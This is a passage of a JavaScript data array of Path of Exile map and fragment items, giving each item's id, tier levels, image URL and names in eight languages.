Carte",language:{code:"fr"}},{name:"'Vaal-Pyramide'-Karte",language:{code:"de"}},{name:"바알 피라미드 지도(Vaal Pyramid Map)",language:{code:"ko"}},{name:"Mapa: Pirâmide Vaal",language:{code:"pt"}},{name:"Карта пирамиды ваал",language:{code:"ru"}},{name:"Mapa de Pirámide Vaal",language:{code:"es"}},{name:"Vaal Pyramid Map",language:{code:"th"}}],region:2},{id:754,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/TemplarFragment.png",names:[{name:"Timeless Templar Emblem",language:{code:"en"}},{name:"Emblème intemporel des Templiers",language:{code:"fr"}},{name:"Immerwährendes Emblem der Templer",language:{code:"de"}},{name:"무궁한 템플러 상징",language:{code:"ko"}},{name:"Emblema Atemporal Templário",language:{code:"pt"}},{name:"Вневременной знак храмовников",language:{code:"ru"}},{name:"Emblema atemporal templario",language:{code:"es"}},{name:"Timeless Templar Emblem",language:{code:"th"}}],region:-1},{id:722,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMapGuardianHoly.png",names:[{name:"Fragment of Constriction",language:{code:"en"}},{name:"Fragment de la Constriction",language:{code:"fr"}},{name:"Fragment des Unterdrückung",language:{code:"de"}},{name:"속박의 조각",language:{code:"ko"}},{name:"Fragmento do Constritor",language:{code:"pt"}},{name:"Фрагмент угнетения",language:{code:"ru"}},{name:"Fragmento de constricción",language:{code:"es"}},{name:"Fragment of Constriction",language:{code:"th"}}],region:-1},{id:368,tier:4,tiers:[4,8,11,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/JungleValley.png?scale=1&mn=11&mt=",names:[{name:"Jungle Valley Map",language:{code:"en"}},{name:"Vallée de la jungle, Carte",language:{code:"fr"}},{name:"'Dschungeltal'-Karte",language:{code:"de"}},{name:"밀림 계곡 지도(Jungle Valley Map)",language:{code:"ko"}},{name:"Mapa: Vale Selvagem",language:{code:"pt"}},{name:"Карта долины джунглей",language:{code:"ru"}},{name:"Mapa de Valle de la Jungla",language:{code:"es"}},{name:"Jungle Valley Map",language:{code:"th"}}],region:5},{id:410,tier:8,tiers:[0,8,12,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Boulevard.png?scale=1&mn=11&mt=",names:[{name:"Siege Map",language:{code:"en"}},{name:"Siège, Carte",language:{code:"fr"}},{name:"'Belagerung'-Karte",language:{code:"de"}},{name:"공성 지도(Siege Map)",language:{code:"ko"}},{name:"Mapa: Cerco",language:{code:"pt"}},{name:"Карта осаждённого города",language:{code:"ru"}},{name:"Mapa de Asedio",language:{code:"es"}},{name:"Siege Map",language:{code:"th"}}],region:3},{id:723,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/AtlasMapGuardianChaos.png",names:[{name:"Fragment of Purification",language:{code:"en"}},{name:"Fragment de la Purification",language:{code:"fr"}},{name:"Fragment des Läuterung",language:{code:"de"}},{name:"정화의 조각",language:{code:"ko"}},{name:"Fragmento do Purificador",language:{code:"pt"}},{name:"Фрагмент искупления",language:{code:"ru"}},{name:"Fragmento de purificación",language:{code:"es"}},{name:"Fragment of Purification",language:{code:"th"}}],region:-1},{id:607,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/olmec.png",names:[{name:"Olmec's Sanctum",language:{code:"en"}},{name:"Le Sanctuaire d'Olmec",language:{code:"fr"}},{name:"Olmecs Heiligtum",language:{code:"de"}},{name:"올멕의 지성소(Olmec's Sanctum)",language:{code:"ko"}},{name:"Santuário Olmeca",language:{code:"pt"}},{name:"Святилище Ольмека",language:{code:"ru"}},{name:"Santuario de Olmec",language:{code:"es"}},{name:"Olmec's Sanctum",language:{code:"th"}}],region:-1},{id:363,tier:3,tiers:[3,6,10,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/IvoryTemple.png?scale=1&mn=11&mt=",names:[{name:"Ivory Temple Map",language:{code:"en"}},{name:"Temple d'ivoire, Carte",language:{code:"fr"}},{name:"'Elfenbeintempel'-Karte",language:{code:"de"}},{name:"상아 사원 지도(Ivory Temple Map)",language:{code:"ko"}},{name:"Mapa: Templo de Marfim",language:{code:"pt"}},{name:"Карта храма из слоновой кости",language:{code:"ru"}},{name:"Mapa de Templo de Marfil",language:{code:"es"}},{name:"Ivory Temple Map",language:{code:"th"}}],region:3},{id:352,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Glacier.png?scale=1&mn=11&mt=",names:[{name:"Glacier Map",language:{code:"en"}},{name:"Glacier, Carte",language:{code:"fr"}},{name:"'Gletscher'-Karte",language:{code:"de"}},{name:"빙하 지도(Glacier Map)",language:{code:"ko"}},{name:"Mapa: Geleira",language:{code:"pt"}},{name:"Карта ледника",language:{code:"ru"}},{name:"Mapa de Glaciar",language:{code:"es"}},{name:"Glacier Map",language:{code:"th"}}],region:2},{id:707,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal03.png",names:[{name:"Mortal Ignorance",language:{code:"en"}},{name:"Ignorance mortifère",language:{code:"fr"}},{name:"Tödliche Ignoranz",language:{code:"de"}},{name:"필멸의 무지",language:{code:"ko"}},{name:"Ignorância Mortal",language:{code:"pt"}},{name:"Смертное невежество",language:{code:"ru"}},{name:"Ignorancia Mortal",language:{code:"es"}},{name:"Mortal Ignorance",language:{code:"th"}}],region:-1},{id:405,tier:9,tiers:[0,9,12,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Vault.png?scale=1&mn=11&mt=",names:[{name:"Vault Map",language:{code:"en"}},{name:"Chambre forte, Carte",language:{code:"fr"}},{name:"'Schatzkammer'-Karte",language:{code:"de"}},{name:"금고실 지도(Vault Map)",language:{code:"ko"}},{name:"Mapa: Forte",language:{code:"pt"}},{name:"Карта хранилища",language:{code:"ru"}},{name:"Mapa de Bóveda",language:{code:"es"}},{name:"Vault Map",language:{code:"th"}}],region:3},{id:334,tier:12,tiers:[0,0,0,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Cavern.png?scale=1&mn=11&mt=",names:[{name:"Flooded Mine Map",language:{code:"en"}},{name:"Mine inondée, Carte",language:{code:"fr"}},{name:"'Überflutete Mine'-Karte",language:{code:"de"}},{name:"물에 잠긴 광산 지도(Flooded Mine Map)",language:{code:"ko"}},{name:"Mapa: Mina Inundada",language:{code:"pt"}},{name:"Карта затопленной шахты",language:{code:"ru"}},{name:"Mapa de Mina Inundada",language:{code:"es"}},{name:"Flooded Mine Map",language:{code:"th"}}],region:1},{id:758,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/LabyrinthHarvest.png",names:[{name:"Tribute to the Goddess",language:{code:"en"}},{name:"Tribut à la déesse",language:{code:"fr"}},{name:"Tribut an die Göttin",language:{code:"de"}},{name:"여신에게 바치는 제물",language:{code:"ko"}},{name:"Tributo à Deusa",language:{code:"pt"}},{name:"Дань богине",language:{code:"ru"}},{name:"Tributo a la Diosa",language:{code:"es"}},{name:"Tribute to the Goddess",language:{code:"th"}}],region:-1},{id:435,tier:10,tiers:[0,0,10,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Villa.png?scale=1&mn=11&mt=",names:[{name:"Mapa de Villa",language:{code:"es"}},{name:"Villa Map",language:{code:"th"}},{name:"Villa Map",language:{code:"en"}},{name:"Villa, Carte",language:{code:"fr"}},{name:"'Villa'-Karte",language:{code:"de"}},{name:"빌라 지도(Villa Map)",language:{code:"ko"}},{name:"Mapa: Quinta",language:{code:"pt"}},{name:"Карта поместья",language:{code:"ru"}}],region:6},{id:336,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Iceberg.png?scale=1&mn=11&mt=",names:[{name:"Iceberg Map",language:{code:"en"}},{name:"Iceberg, Carte",language:{code:"fr"}},{name:"'Eisberg'-Karte",language:{code:"de"}},{name:"빙산 지도(Iceberg Map)",language:{code:"ko"}},{name:"Mapa: Iceberg",language:{code:"pt"}},{name:"Карта айсберга",language:{code:"ru"}},{name:"Mapa de Iceberg",language:{code:"es"}},{name:"Iceberg Map",language:{code:"th"}}],region:2},{id:388,tier:12,tiers:[0,0,12,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Laboratory.png?scale=1&mn=11&mt=",names:[{name:"Laboratory Map",language:{code:"en"}},{name:"Laboratoire, Carte",language:{code:"fr"}},{name:"'Laboratorium'-Karte",language:{code:"de"}},{name:"실험실 지도(Laboratory Map)",language:{code:"ko"}},{name:"Mapa: Laboratório",language:{code:"pt"}},{name:"Карта лаборатории",language:{code:"ru"}},{name:"Mapa de Laboratorio",language:{code:"es"}},{name:"Laboratory Map",language:{code:"th"}}],region:7},{id:360,tier:1,tiers:[1,4,8,10,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Channel.png?scale=1&mn=11&mt=",names:[{name:"Channel Map",language:{code:"en"}},{name:"Canal, Carte",language:{code:"fr"}},{name:"'Kanal'-Karte",language:{code:"de"}},{name:"물길 지도(Channel Map)",language:{code:"ko"}},{name:"Mapa: Canal",language:{code:"pt"}},{name:"Карта канала",language:{code:"ru"}},{name:"Mapa de Cauce",language:{code:"es"}},{name:"Channel Map",language:{code:"th"}}],region:6},{id:706,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaal02.png",names:[{name:"Mortal Hope",language:{code:"en"}},{name:"Espoir mortifère",language:{code:"fr"}},{name:"Tödliche Hoffnung",language:{code:"de"}},{name:"필멸의 희망",language:{code:"ko"}},{name:"Esperança Mortal",language:{code:"pt"}},{name:"Смертная надежда",language:{code:"ru"}},{name:"Esperanza Mortal",language:{code:"es"}},{name:"Mortal Hope",language:{code:"th"}}],region:-1},{id:750,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/ChayulasPureBreachstone.png",names:[{name:"Chayula's Pure Breachstone",language:{code:"en"}},{name:"Pierre de Brèche pure de Chayula",language:{code:"fr"}},{name:"Chayulas purer Riss-Stein",language:{code:"de"}},{name:"차율라의 순수한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Pura de Chayula",language:{code:"pt"}},{name:"Очищенный камень Разлома Чаюлы",language:{code:"ru"}},{name:"Piedra de Fisura Pura de Chayula",language:{code:"es"}},{name:"Chayula's Pure Breachstone",language:{code:"th"}}],region:-1},{id:374,tier:5,tiers:[0,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Atoll.png?scale=1&mn=11&mt=",names:[{name:"Atoll Map",language:{code:"en"}},{name:"Atoll, Carte",language:{code:"fr"}},{name:"'Atoll'-Karte",language:{code:"de"}},{name:"산호섬 지도(Atoll Map)",language:{code:"ko"}},{name:"Mapa: Atol",language:{code:"pt"}},{name:"Карта атолла",language:{code:"ru"}},{name:"Mapa de Atolón",language:{code:"es"}},{name:"Atoll Map",language:{code:"th"}}],region:1},{id:328,tier:2,tiers:[2,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Graveyard.png?scale=1&mn=11&mt=",names:[{name:"Graveyard Map",language:{code:"en"}},{name:"Champ du repos, Carte",language:{code:"fr"}},{name:"'Friedhof'-Karte",language:{code:"de"}},{name:"묘지 지도(Graveyard Map)",language:{code:"ko"}},{name:"Mapa: Sepulcrário",language:{code:"pt"}},{name:"Карта кладбища",language:{code:"ru"}},{name:"Mapa de Cementerio",language:{code:"es"}},{name:"Graveyard Map",language:{code:"th"}}],region:5},{id:753,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/EternalEmpireFragment.png",names:[{name:"Timeless Eternal Emblem",language:{code:"en"}},{name:"Emblème intemporel de l'Empire éternel",language:{code:"fr"}},{name:"Immerwährendes Emblem des Ewigen Kaiserreichs",language:{code:"de"}},{name:"무궁한 영원의 상징",language:{code:"ko"}},{name:"Emblema Atemporal Eterno",language:{code:"pt"}},{name:"Вневременной знак Вечных",language:{code:"ru"}},{name:"Emblema atemporal eterno",language:{code:"es"}},{name:"Timeless Eternal Emblem",language:{code:"th"}}],region:-1},{id:351,tier:8,tiers:[0,0,8,10,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Grotto.png?scale=1&mn=11&mt=",names:[{name:"Grotto Map",language:{code:"en"}},{name:"Grotte, Carte",language:{code:"fr"}},{name:"'Grotte'-Karte",language:{code:"de"}},{name:"석굴 지도(Grotto Map)",language:{code:"ko"}},{name:"Mapa: Gruta",language:{code:"pt"}},{name:"Карта грота",language:{code:"ru"}},{name:"Mapa de Gruta",language:{code:"es"}},{name:"Grotto Map",language:{code:"th"}}],region:6},{id:343,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/BurialChambers.png?scale=1&mn=11&mt=",names:[{name:"Burial Chambers Map",language:{code:"en"}},{name:"Chambres funéraires, Carte",language:{code:"fr"}},{name:"'Grabkammern'-Karte",language:{code:"de"}},{name:"묘실 지도(Burial Chambers Map)",language:{code:"ko"}},{name:"Mapa: Câmaras Sepulcrais",language:{code:"pt"}},{name:"Карта погребальных камер",language:{code:"ru"}},{name:"Mapa de Aposentos del Entierro",language:{code:"es"}},{name:"Burial Chambers Map",language:{code:"th"}}],region:4},{id:384,tier:9,tiers:[0,0,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/UndergroundRiver.png?scale=1&mn=11&mt=",names:[{name:"Underground River Map",language:{code:"en"}},{name:"Rivière souterraine, Carte",language:{code:"fr"}},{name:"'Unterirdischer Fluss'-Karte",language:{code:"de"}},{name:"지하 강 지도(Underground River Map)",language:{code:"ko"}},{name:"Mapa: Rio Subterrâneo",language:{code:"pt"}},{name:"Карта подземной реки",language:{code:"ru"}},{name:"Mapa de Río Subterráneo",language:{code:"es"}},{name:"Underground River Map",language:{code:"th"}}],region:2},{id:713,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/PaleCourt04.png",names:[{name:"Volkuur's Key",language:{code:"en"}},{name:"Clé de Volkuur",language:{code:"fr"}},{name:"Volkuurs Schlüssel",language:{code:"de"}},{name:"볼쿠르의 열쇠",language:{code:"ko"}},{name:"Chave de Volkuur",language:{code:"pt"}},{name:"Ключ Волкуур",language:{code:"ru"}},{name:"Llave de Volkuur",language:{code:"es"}},{name:"Volkuur's Key",language:{code:"th"}}],region:-1},{id:419,tier:3,tiers:[3,6,9,12,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Orchard.png?scale=1&mn=11&mt=",names:[{name:"Orchard Map",language:{code:"en"}},{name:"Verger, Carte",language:{code:"fr"}},{name:"'Obstgarten'-Karte",language:{code:"de"}},{name:"과수원 지도(Orchard Map)",language:{code:"ko"}},{name:"Mapa: Pomar",language:{code:"pt"}},{name:"Карта фруктового сада",language:{code:"ru"}},{name:"Mapa de Huerto",language:{code:"es"}},{name:"Orchard Map",language:{code:"th"}}],region:5},{id:377,tier:14,tiers:[0,0,0,0,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Tribunal.png?scale=1&mn=11&mt=",names:[{name:"Crater Map",language:{code:"en"}},{name:"Cratère, Carte",language:{code:"fr"}},{name:"'Krater'-Karte",language:{code:"de"}},{name:"분화구 지도(Crater Map)",language:{code:"ko"}},{name:"Mapa: Cratera",language:{code:"pt"}},{name:"Карта кратера",language:{code:"ru"}},{name:"Mapa de Cráter",language:{code:"es"}},{name:"Crater Map",language:{code:"th"}}],region:1},{id:414,tier:4,tiers:[4,8,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Wasteland.png?scale=1&mn=11&mt=",names:[{name:"Wasteland Map",language:{code:"en"}},{name:"Terre désolée, Carte",language:{code:"fr"}},{name:"'Ödland'-Karte",language:{code:"de"}},{name:"황무지 지도(Wasteland Map)",language:{code:"ko"}},{name:"Mapa: Devastação",language:{code:"pt"}},{name:"Карта пустоши",language:{code:"ru"}},{name:"Mapa de Páramo",language:{code:"es"}},{name:"Wasteland Map",language:{code:"th"}}],region:7},{id:426,tier:5,tiers:[0,5,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Waterways.png?scale=1&mn=11&mt=",names:[{name:"Waterways Map",language:{code:"en"}},{name:"Aqueduc, Carte",language:{code:"fr"}},{name:"'Wasserwege'-Karte",language:{code:"de"}},{name:"수로 지도(Waterways Map)",language:{code:"ko"}},{name:"Mapa: Canais",language:{code:"pt"}},{name:"Карта водотоков",language:{code:"ru"}},{name:"Mapa de Canales",language:{code:"es"}},{name:"Waterways Map",language:{code:"th"}}],region:1},{id:386,tier:5,tiers:[5,8,11,12,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/ArachnidNest.png?scale=1&mn=11&mt=",names:[{name:"Arachnid Nest Map",language:{code:"en"}},{name:"Nid d'arachnides, Carte",language:{code:"fr"}},{name:"'Arachnidennest'-Karte",language:{code:"de"}},{name:"거미류 둥지 지도(Arachnid Nest Map)",language:{code:"ko"}},{name:"Mapa: Ninho Aracnídeo",language:{code:"pt"}},{name:"Карта гнезда пауков",language:{code:"ru"}},{name:"Mapa de Nido Arácnido",language:{code:"es"}},{name:"Arachnid Nest Map",language:{code:"th"}}],region:3},{id:854,tier:10,tiers:[0,0,10,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/ForbiddenWoods.png?scale=1&mn=11&mt=",names:[{name:"Forbidden Woods Map",language:{code:"en"}},{name:"Forbidden Woods Map",language:{code:"fr"}},{name:"Forbidden Woods Map",language:{code:"de"}},{name:"Forbidden Woods Map",language:{code:"ko"}},{name:"Forbidden Woods Map",language:{code:"pt"}},{name:"Forbidden Woods Map",language:{code:"ru"}},{name:"Forbidden Woods Map",language:{code:"es"}},{name:"Forbidden Woods Map",language:{code:"th"}}],region:5},{id:747,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/TulsPureBreachstone.png",names:[{name:"Tul's Pure Breachstone",language:{code:"en"}},{name:"Pierre de Brèche pure de Tul",language:{code:"fr"}},{name:"Tuls purer Riss-Stein",language:{code:"de"}},{name:"툴의 순수한 균열석",language:{code:"ko"}},{name:"Pedra de Fenda Pura de Tul",language:{code:"pt"}},{name:"Очищенный камень Разлома Тул",language:{code:"ru"}},{name:"Piedra de Fisura Pura de Tul",language:{code:"es"}},{name:"Tul's Pure Breachstone",language:{code:"th"}}],region:-1},{id:376,tier:16,tiers:[0,0,0,0,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/UndergroundSea.png?scale=1&mn=11&mt=",names:[{name:"Underground Sea Map",language:{code:"en"}},{name:"Mer souterraine, Carte",language:{code:"fr"}},{name:"'Unterirdischer See'-Karte",language:{code:"de"}},{name:"지하 해양 지도(Underground Sea Map)",language:{code:"ko"}},{name:"Mapa: Mar Subterrâneo",language:{code:"pt"}},{name:"Карта подземного моря",language:{code:"ru"}},{name:"Mapa de Mar Subterráneo",language:{code:"es"}},{name:"Underground Sea Map",language:{code:"th"}}],region:6},{id:709,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberVaalComplete.png",names:[{name:"Mortal Set",language:{code:"en"}},{name:"Ensemble mortifère",language:{code:"fr"}},{name:"Tödliches Set",language:{code:"de"}},{name:"필멸 세트",language:{code:"ko"}},{name:"Conjunto Mortal",language:{code:"pt"}},{name:"Набор Смертных",language:{code:"ru"}},{name:"Set Mortal",language:{code:"es"}},{name:"Mortal Set",language:{code:"th"}}],region:-1},{id:333,tier:2,tiers:[2,6,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/AridLake.png?scale=1&mn=11&mt=",names:[{name:"Arid Lake Map",language:{code:"en"}},{name:"Lac aride, Carte",language:{code:"fr"}},{name:"'Ausgetrockneter See'-Karte",language:{code:"de"}},{name:"메마른 호수 지도(Arid Lake Map)",language:{code:"ko"}},{name:"Mapa: Lago Árido",language:{code:"pt"}},{name:"Карта высохшего озера",language:{code:"ru"}},{name:"Mapa de Lago Árido",language:{code:"es"}},{name:"Arid Lake Map",language:{code:"th"}}],region:1},{id:329,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Dungeon.png?scale=1&mn=11&mt=",names:[{name:"Dungeon Map",language:{code:"en"}},{name:"Donjon, Carte",language:{code:"fr"}},{name:"'Verlies'-Karte",language:{code:"de"}},{name:"던전 지도(Dungeon Map)",language:{code:"ko"}},{name:"Mapa: Masmorra",language:{code:"pt"}},{name:"Карта подземелья",language:{code:"ru"}},{name:"Mapa de Mazmorra",language:{code:"es"}},{name:"Dungeon Map",language:{code:"th"}}],region:4},{id:406,tier:3,tiers:[3,7,10,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Temple.png?scale=1&mn=11&mt=",names:[{name:"Temple Map",language:{code:"en"}},{name:"Temple, Carte",language:{code:"fr"}},{name:"'Tempel'-Karte",language:{code:"de"}},{name:"사원 지도(Temple Map)",language:{code:"ko"}},{name:"Mapa: Templo",language:{code:"pt"}},{name:"Карта храма",language:{code:"ru"}},{name:"Mapa de Templo",language:{code:"es"}},{name:"Temple Map",language:{code:"th"}}],region:2},{id:618,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/HarbingerYellow.png",names:[{name:"The Beachhead",language:{code:"en"}},{name:"La Tête de pont",language:{code:"fr"}},{name:"Der Brückenkopf",language:{code:"de"}},{name:"교두보(The Beachhead)",language:{code:"ko"}},{name:"A Cabeça de Ponte",language:{code:"pt"}},{name:"Плацдарм",language:{code:"ru"}},{name:"La Cabecera de la Playa",language:{code:"es"}},{name:"The Beachhead",language:{code:"th"}}],region:-1},{id:729,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/UberElderComplete.png",names:[{name:"Maddening Object",language:{code:"en"}},{name:"Chose aliénante",language:{code:"fr"}},{name:"Objekt des Wahnsinns",language:{code:"de"}},{name:"광기의 물체",language:{code:"ko"}},{name:"Objeto Enlouquecedor",language:{code:"pt"}},{name:"Субстанция безумия",language:{code:"ru"}},{name:"Objeto enloquecedor",language:{code:"es"}},{name:"Maddening Object",language:{code:"th"}}],region:-1},{id:733,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Currency/Breach/BreachFragmentsLightning.png",names:[{name:"Esh's Breachstone",language:{code:"en"}},{name:"Pierre de Brèche d'Esh",language:{code:"fr"}},{name:"Eshs Riss-Stein",language:{code:"de"}},{name:"에쉬의 균열석",language:{code:"ko"}},{name:"Pedra da Fenda de Esh",language:{code:"pt"}},{name:"Камень Разлома Иш",language:{code:"ru"}},{name:"Piedra de Fisura de Esh",language:{code:"es"}},{name:"Esh's Breachstone",language:{code:"th"}}],region:-1},{id:340,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/SulphurWastes.png?scale=1&mn=11&mt=",names:[{name:"Leyline Map",language:{code:"en"}},{name:"Ligne de ley, Carte",language:{code:"fr"}},{name:"'Brachland'-Karte",language:{code:"de"}},{name:"지맥 지도(Leyline Map)",language:{code:"ko"}},{name:"Mapa: Alinhamentos",language:{code:"pt"}},{name:"Карта тропы",language:{code:"ru"}},{name:"Mapa de Línea Ley",language:{code:"es"}},{name:"Leyline Map",language:{code:"th"}}],region:2},{id:611,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/HallOfGrandmasters.png",names:[{name:"Hall of Grandmasters",language:{code:"en"}},{name:"Assemblée des Grands maîtres",language:{code:"fr"}},{name:"Halle der Großmeister",language:{code:"de"}},{name:"명인의 전당(Hall of Grandmasters)",language:{code:"ko"}},{name:"Salão dos Grão-Mestres",language:{code:"pt"}},{name:"Зал великих мастеров",language:{code:"ru"}},{name:"Salón de los Grandes Maestros",language:{code:"es"}},{name:"Hall of Grandmasters",language:{code:"th"}}],region:-1},{id:613,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/WolfMap.png",names:[{name:"Caer Blaidd, Wolfpack's Den",language:{code:"en"}},{name:"Caer Blaidd, la Tanière de la meute",language:{code:"fr"}},{name:"Caer Blaidd – Wolfsrudelhöhle",language:{code:"de"}},{name:"캐어블레이드 늑대의 소굴(Caer Blaidd, Wolfpack's Den)",language:{code:"ko"}},{name:"Caer Blaidd, Toca dos Lobos",language:{code:"pt"}},{name:"Caer Blaidd, логово стаи",language:{code:"ru"}},{name:"Caer Blaidd, Madriguera de Lobos",language:{code:"es"}},{name:"Caer Blaidd, Wolfpack's Den",language:{code:"th"}}],region:-1},{id:620,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Celestial.png",names:[{name:"The Twilight Temple",language:{code:"en"}},{name:"Le Temple du Crépuscule",language:{code:"fr"}},{name:"Der Zwielichttempel",language:{code:"de"}},{name:"황혼의 사원(The Twilight Temple)",language:{code:"ko"}},{name:"Templo do Crepúsculo",language:{code:"pt"}},{name:"Сумеречный храм",language:{code:"ru"}},{name:"El Templo del Crepúsculo",language:{code:"es"}},{name:"The Twilight Temple",language:{code:"th"}}],region:-1},{id:603,tier:90,tiers:[90],img:"https://web.poecdn.com/image/Art/2DItems/Maps/musicbox.png",names:[{name:"Acton's Nightmare",language:{code:"en"}},{name:"Le Cauchemar d'Acton",language:{code:"fr"}},{name:"Actons Albtraum",language:{code:"de"}},{name:"액턴의 악몽(Acton's Nightmare)",language:{code:"ko"}},{name:"Pesadelo de Acton",language:{code:"pt"}},{name:"Кошмар Актоны",language:{code:"ru"}},{name:"Pesadilla de Acton",language:{code:"es"}},{name:"Acton's Nightmare",language:{code:"th"}}],region:-1},{id:339,tier:9,tiers:[0,0,9,11,14],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Excavation.png?scale=1&mn=11&mt=",names:[{name:"Excavation Map",language:{code:"en"}},{name:"Excavation, Carte",language:{code:"fr"}},{name:"'Grabungsstätte'-Karte",language:{code:"de"}},{name:"발굴터 지도(Excavation Map)",language:{code:"ko"}},{name:"Mapa: Escavação",language:{code:"pt"}},{name:"Карта раскопок",language:{code:"ru"}},{name:"Mapa de Excavación",language:{code:"es"}},{name:"Excavation Map",language:{code:"th"}}],region:6},{id:396,tier:13,tiers:[0,0,0,13,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Shore.png?scale=1&mn=11&mt=",names:[{name:"Shore Map",language:{code:"en"}},{name:"Littoral, Carte",language:{code:"fr"}},{name:"'Ufer'-Karte",language:{code:"de"}},{name:"바닷가 지도(Shore Map)",language:{code:"ko"}},{name:"Mapa: Litoral",language:{code:"pt"}},{name:"Карта берега",language:{code:"ru"}},{name:"Mapa de Orilla",language:{code:"es"}},{name:"Shore Map",language:{code:"th"}}],region:2},{id:346,tier:5,tiers:[5,8,12,14,16],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/CitySquare.png?scale=1&mn=11&mt=",names:[{name:"City Square Map",language:{code:"en"}},{name:"Grand-place, Carte",language:{code:"fr"}},{name:"'Stadtplatz'-Karte",language:{code:"de"}},{name:"도시 광장 지도(City Square Map)",language:{code:"ko"}},{name:"Mapa: Praça da Cidade",language:{code:"pt"}},{name:"Карта городской площади",language:{code:"ru"}},{name:"Mapa de Plaza de Ciudad",language:{code:"es"}},{name:"City Square Map",language:{code:"th"}}],region:3},{id:458,tier:15,tiers:[0,0,0,0,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Reef.png?scale=1&mn=11&mt=",names:[{name:"Reef Map",language:{code:"en"}},{name:"Récif, Carte",language:{code:"fr"}},{name:"'Riff'-Karte",language:{code:"de"}},{name:"암초 지도(Reef Map)",language:{code:"ko"}},{name:"Mapa: Recife",language:{code:"pt"}},{name:"Карта рифа",language:{code:"ru"}},{name:"Mapa de Arrecife",language:{code:"es"}},{name:"Reef Map",language:{code:"th"}}],region:4},{id:347,tier:11,tiers:[0,0,11,13,15],img:"https://web.poecdn.com/image/Art/2DItems/Maps/Atlas2Maps/New/Antiquary.png?scale=1&mn=11&mt=",names:[{name:"Relic Chambers Map",language:{code:"en"}},{name:"Chambres reliquaires, Carte",language:{code:"fr"}},{name:"'Reliktkammern'-Karte",language:{code:"de"}},{name:"유물의 방 지도(Relic Chambers Map)",language:{code:"ko"}},{name:"Mapa: Câmaras de Relíquias",language:{code:"pt"}},{name:"Карта палаты древностей",language:{code:"ru"}},{name:"Mapa de las Cámaras de Reliquias",language:{code:"es"}},{name:"Relic Chambers Map",language:{code:"th"}}],region:0},{id:752,tier:100,tiers:[100],img:"https://web.poecdn.com/image/Art/2DItems/Maps/MarakethFragment.png",names:[{name:"Timeless Maraketh Emblem",language:{code:"en"}},{name:"Emblème intemporel des Marakeths",language:{code:"fr"}},{name:"Immerwährendes Emblem der Maraketh",language:{code:"de"}},{name:"무궁한 마라케스 상징",language:{code:"ko"}},{name:"Emblema Atemporal Maraketh",language:{code:"pt"}},{name:"Вневременной знак маракетов",language:{code:"ru"}},{name:"Emblema atemporal maraketh",language:{code:"es"}},{name:"Timeless Maraketh 